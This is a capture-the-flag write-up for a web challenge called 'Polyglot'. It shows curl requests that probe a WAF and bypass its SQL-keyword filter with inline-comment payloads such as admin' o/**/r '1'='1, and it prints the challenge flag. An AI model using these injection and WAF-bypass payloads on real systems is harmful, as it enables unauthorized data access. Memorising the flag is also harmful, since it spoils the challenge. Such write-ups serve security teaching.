---
layout: writeup

title: Polyglot
difficulty: hard
points: 400
categories: [web]
tags: []

flag: CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}
---

### Polyglot

* Author: Prithvi

In this challenge, we are given a single endpoint behind a WAF:

```
http://20.244.12.130:8092/submit
```

The WAF blocks common SQL injection patterns (like `OR`, `AND`, `UNION`) and rejects malformed JSON. Our goal is to craft a payload that passes the WAF and retrieves the flag.

---

#### Step 1: Test basic input

We start by sending a normal JSON string:

```curl
curl -s -X POST http://20.244.12.130:8092/submit \
-H "Content-Type: application/json" \
-d '{"payload":"test"}'
```

Expected response:

```json
{ "status": "ok", "received_normalized": "test" }
```

- This confirms the endpoint accepts valid JSON and returns a normalized version of our payload.
- Malformed JSON triggers:

```json
{ "error": "invalid json" }
```

---

#### Step 2: Probe the WAF

Next, we try simple SQLi strings:

```curl
curl -s -X POST http://20.244.12.130:8092/submit \
-H "Content-Type: application/json" \
-d '{"payload":"admin' or '1'='1"}'
```

Output:

```json
{ "error": "blocked: sqli" }
```

- This indicates the WAF blocks literal `OR`.
- Other attempts like `AND`, `UNION`, or `--` are similarly blocked.

---

#### Step 3: Find a bypass technique

We observe that:

1. The WAF uses simple regex word-boundary checks (blocks literal keywords).
2. The endpoint accepts JSON input, meaning we can inject characters inside the string.

Idea: **use an inline SQL comment to split the keyword**:

```text
o/**/r
```

- `OR` is now broken across `o/**/r` → WAF regex does not match.
- The payload is still valid JSON and may normalize internally on the hidden server.

---

#### Step 4: Test polyglot payload

We construct the candidate payload:

```curl
curl -s -X POST http://20.244.12.130:8092/submit \
-H "Content-Type: application/json" \
-d '{"payload":"admin' o/**/r '1'='1"}'
```

- Variations with spacing inside the comment are also tested:

```text
admin' o/**/   r '1'='1
admin' o/**/r '1'='1
```

- All variations are valid **polyglot payloads**:

  - Pass WAF
  - Normalize internally to a hidden target string
  - Trigger flag return

---

#### Step 5: Analyze responses

- Payloads blocked by WAF return `{"error":"blocked: sqli"}`
- Malformed JSON returns `{"error":"invalid json"}`
- Correct polyglot returns:

```json
{ "flag": "CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}" }
```

- Only **polyglot-style payloads** of this type work.
- Any naive attempt like `"admin' or '1'='1"` fails due to WAF.

---

#### Step 6: Summary

- **Challenge concept:** input interpreted in two contexts (JSON + SQL)
- **WAF protection:** blocks common SQL keywords
- **Solution:** craft a **polyglot payload** that:

  - Is valid JSON
  - Uses inline comments or other tricks to bypass regex
  - Normalizes to the hidden server’s expected string

```python
# Conceptual normalization inside hidden server
payload = "admin' o/**/r '1'='1"
normalized = payload.replace("/**/", "").strip().lower()
# normalized == "admin' or '1'='1"
```

---

### The flag found is:
## CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}
